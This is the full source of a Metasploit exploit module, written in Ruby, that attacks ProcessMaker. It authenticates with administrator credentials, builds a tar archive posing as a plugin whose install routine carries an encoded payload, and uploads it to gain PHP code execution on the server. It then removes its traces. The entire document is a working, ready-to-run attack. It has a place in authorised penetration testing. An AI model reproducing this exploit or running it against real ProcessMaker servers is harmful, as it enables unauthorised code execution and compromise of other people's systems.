# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ProcessMaker Plugin Upload&#039;,
      &#039;Description&#039;    => %q{
        This module will generate and upload a plugin to ProcessMaker
        resulting in execution of PHP code as the web server user.
 
        Credentials for a valid user account with Administrator roles
        is required to run this module.
 
        This module has been tested successfully on ProcessMaker versions
        1.6-4276, 2.0.23, 3.0 RC 1, 3.2.0, 3.2.1 on Windows 7 SP 1;
        and version 3.2.0 on Debian Linux 8.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => &#039;Brendan Coles <bcoles[at]gmail.com>&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://wiki.processmaker.com/3.0/Plugin_Development&#039;]
        ],
      &#039;Payload&#039;        => { &#039;Space&#039; => 20000 },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic Targeting&#039;, {} ]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Aug 25 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for ProcessMaker&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for ProcessMaker&#039;, &#039;admin&#039;]),
        OptString.new(&#039;WORKSPACE&#039;, [true, &#039;The ProcessMaker workspace&#039;, &#039;workflow&#039;])
      ])
  end
 
  def login(user, pass)
    vars_post = Hash[{
      &#039;form[USR_USERNAME]&#039; => Rex::Text.uri_encode(user, &#039;hex-normal&#039;),
      &#039;form[USR_PASSWORD]&#039; => Rex::Text.uri_encode(pass, &#039;hex-normal&#039;)
    }.to_a.shuffle]
 
    print_status "Authenticating as user &#039;#{user}&#039;"
    uri = normalize_uri target_uri.path, "/sys#{@workspace}/en/neoclassic/login/authentication.php"
    res = send_request_cgi &#039;method&#039;    => &#039;POST&#039;,
                           &#039;uri&#039;       => uri,
                           &#039;cookie&#039;    => @cookie,
                           &#039;vars_post&#039; => vars_post
 
    if !res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    elsif res.code == 200 && res.body =~ /Loading styles and images/
      # ProcessMaker 2.x and 3.x
      print_good "#{peer} Authenticated as user &#039;#{user}&#039;"
    elsif res.code == 302 && res.headers[&#039;location&#039;] =~ /(cases|processes)/
      # ProcessMaker 1.x
      print_good "#{peer} Authenticated as user &#039;#{user}&#039;"
    else
      fail_with Failure::NoAccess, "#{peer} - Authentication failed"
    end
  end
 
  def upload_plugin plugin_name
    data = generate_plugin plugin_name
 
    print_status "#{peer} Uploading plugin &#039;#{plugin_name}&#039; (#{data.length} bytes)"
 
    # ProcessMaker 1.x requires "-" after the plugin name in the file name
    fname = "#{plugin_name}-.tar"
 
    boundary = "----WebKitFormBoundary#{rand_text_alphanumeric rand(10) + 5}"
    post_data = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"__notValidateThisFields__\"\r\n"
    post_data << "\r\n\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"DynaformRequiredFields\"\r\n"
    post_data << "\r\n[]\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"form[PLUGIN_FILENAME]\"; filename=\"#{fname}\"\r\n"
    post_data << "Content-Type: application/x-tar\r\n"
    post_data << "\r\n#{data}\r\n"
    post_data << "--#{boundary}\r\n"
 
    uri = normalize_uri target_uri.path, "/sys#{@workspace}/en/neoclassic/setup/pluginsImportFile"
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{boundary}",
      &#039;cookie&#039; => @cookie,
      &#039;data&#039;   => post_data
    }, 5)
 
    # If a response is received, something probably went wrong.
    if res
      if res.headers[&#039;location&#039;] =~ /login/
        fail_with Failure::NoAccess, &#039;Administrator privileges are required&#039;
      else
        print_warning "#{peer} Unexpected reply"
      end
    end
  end
 
  def delete_plugin(plugin_name)
    uri = normalize_uri target_uri.path, "/sys#{@workspace}/en/neoclassic/setup/pluginsRemove"
    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => uri,
      &#039;cookie&#039;    => @cookie,
      &#039;vars_post&#039; => { &#039;pluginUid&#039; => plugin_name }
    }, 5)
  end
 
  def generate_plugin(plugin_name)
    plugin_class = %Q|<?php
      class #{plugin_name}Class extends PMPlugin {
        function __construct() {
          set_include_path(
            PATH_PLUGINS . &#039;#{plugin_name}&#039; . PATH_SEPARATOR .
            get_include_path()
          );
        }
      }
    |
 
    plugin_php = %Q|<?php
      G::LoadClass("plugin");
 
      class #{plugin_name}Plugin extends PMPlugin
      {
        public function #{plugin_name}Plugin($sNamespace, $sFilename = null)
        {
          $res = parent::PMPlugin($sNamespace, $sFilename);
          $this->sFriendlyName = "#{plugin_name}";
          $this->sDescription  = "#{plugin_name}";
          $this->sPluginFolder = "#{plugin_name}";
          $this->sSetupPage    = "setup";
          $this->iVersion      = 1;
          $this->aWorkspaces   = null;
          return $res;
        }
        public function setup() {}
        public function install() { #{payload.encoded} }
        public function enable() {}
        public function disable() {}
      }
 
      $oPluginRegistry =& PMPluginRegistry::getSingleton();
      $oPluginRegistry->registerPlugin(&#039;#{plugin_name}&#039;, __FILE__);
    |
 
    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file "#{plugin_name}.php", 0777 do |io|
        io.write plugin_php
      end
      tar.add_file "#{plugin_name}/class.#{plugin_name}.php", 0777 do |io|
        io.write plugin_class
      end
    end
    tarfile.rewind
    tarfile.read
  end
 
  def cleanup
    delete_plugin @plugin_name
  end
 
  def exploit
    @workspace = datastore[&#039;WORKSPACE&#039;]
 
    @cookie = "PHPSESSID=#{rand_text_alphanumeric rand(10) + 10};"
    login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]
 
    @plugin_name = rand_text_alpha rand(10) + 10
    upload_dir = "../../shared/sites/#{@workspace}/files/input/"
    register_file_for_cleanup "#{upload_dir}#{@plugin_name}-.tar"
    register_file_for_cleanup "#{upload_dir}#{@plugin_name}.php"
    register_file_for_cleanup "#{upload_dir}#{@plugin_name}/class.#{@plugin_name}.php"
    register_dir_for_cleanup "#{upload_dir}#{@plugin_name}"
 
    upload_plugin @plugin_name
  end
end

